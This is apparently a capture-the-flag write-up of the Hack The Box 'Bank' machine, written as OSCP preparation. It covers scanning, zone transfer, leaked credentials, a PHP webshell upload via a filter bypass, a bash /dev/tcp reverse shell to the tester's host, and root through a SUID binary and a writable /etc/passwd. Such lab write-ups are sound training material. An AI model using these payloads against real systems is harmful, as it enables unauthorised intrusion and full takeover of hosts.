## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

## 🛰️ Recon

### 🔍 Full TCP Port Scan
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.29
```

### 🔍 Targeted Script & Version Scan
```bash
nmap -p 22,53,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.29
```

### 🔍 UDP Scan (DNS)
```bash
nmap -p- -sU --min-rate 10000 -oA scans/nmap-alludp 10.10.10.29
```

---

## 🌐 DNS & VHost Enumeration

### 🔎 Zone Transfer to Discover Subdomains
```bash
dig axfr bank.htb @10.10.10.29
```

### 📝 Add to /etc/hosts
```
10.10.10.29 bank.htb chris.bank.htb ns.bank.htb www.bank.htb
```

### 🌐 Virtual Host Brute-Force
```bash
wfuzz -u http://10.10.10.29/ -H "Host: FUZZ.bank.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 11510
```

---

## 🧪 Web Enumeration [HTTP](HTTP.md)

### 🧱 Gobuster (PHP Extensions)
```bash
gobuster dir -u http://bank.htb \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php -t 50 -o scans/gobuster-bank.htb-root-medium-php
```

### 📂 Interesting Results
- `/balance-transfer/` → holds `.acc` files
- `/uploads/` → 403 Forbidden
- `/inc/` → contains internal PHP includes
- `/support.php` → file upload

---

## 🔓 Shell as `www-data`

### 📁 Analyze Balance-Transfer Files
```bash
curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | wc -l
curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
```
> Found one broken file with **plaintext creds**:  
> **Email**: chris@bank.htb  
> **Password**: `!##HTBB4nkP4ssw0rd!##`

### 🔐 Login via Web
> Log in to the portal using `chris / !##HTBB4nkP4ssw0rd!##`

---

## 🛠 Webshell Upload & Execution

### 🛡️ Filter Bypass – Debug Hint Reveals `.htb` Executable Extension

**Webshell**: `cmd.htb`
```php
<?php system($_REQUEST["cmd"]); ?>
```

**Execution**:
```bash
curl http://bank.htb/uploads/cmd.htb?cmd=id
```

### 🐚 Reverse Shell
Listener:
```bash
nc -lnvp 443
```

Payload:
```bash
curl http://bank.htb/uploads/cmd.htb \
--data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.41/443 0>&1"'
```

Shell Upgrade:
```bash
python -c 'import pty; pty.spawn("bash")'
# In local terminal:
stty raw -echo; fg
export TERM=screen
```

---

## 🔐 Privilege Escalation

### 🔍 SUID Binary Method #1 (Backdoor)
```bash
find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency  # Custom SUID root binary

/var/htb/bin/emergency
id && cat /root/root.txt
```

### 🔍 `/etc/passwd` Writable Method #2 (Manual Root User Injection)
```bash
# Create root-equivalent user
openssl passwd -1 0xdf
# Result: $1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0

echo 'oxdf:$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0:0:0:root:/root:/bin/bash' >> /etc/passwd
su - oxdf
```

---

## 🔍 Beyond Root

### 🔁 Improper Redirects
```php
// /inc/header.php
if(empty($_SESSION['username'])){
  header("location: login.php");
  return;  // ❌ Should be 'exit;' instead
}
```

### 🔍 SUID Analysis
```bash
md5sum /var/htb/bin/emergency
md5sum /bin/dash
# Identical → emergency is renamed dash
```